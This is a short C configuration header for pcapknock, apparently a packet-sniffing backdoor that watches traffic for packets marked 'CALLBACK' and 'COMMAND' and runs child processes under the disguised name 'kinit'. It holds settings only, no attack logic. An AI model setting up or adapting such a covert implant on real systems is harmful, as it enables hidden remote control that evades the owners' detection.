/*
 * config.h
 * Configuration for pcapknock
 * By J. Stuart McMurray
 * Created 20190321
 * Last Modified 20190321
 */

#ifndef HAVE_CONFIG_H
#define HAVE_CONFIG_H

/* PCAPDEV is the device on which to sniff packets for commands.  If it is
 * NULL, not defined or is the empty string, all available devices will be
 * used. */
#define CAPTUREDEV "axe0"

/* These two strings surround the callback address and command, respectively. */
#define CBFLAG  "CALLBACK"
#define CMDFLAG "COMMAND"

/* CHILDNAME is the name used for child processes (i.e. argv[0]). */
#define CHILDNAME "kinit"

/* If DAEMON is defined and pcapknock is run as a standalone process, it
 * causes the process to be run detached from the terminal. */
//#define DAEMON

#endif /* #ifndef HAVE_CONFIG_H */
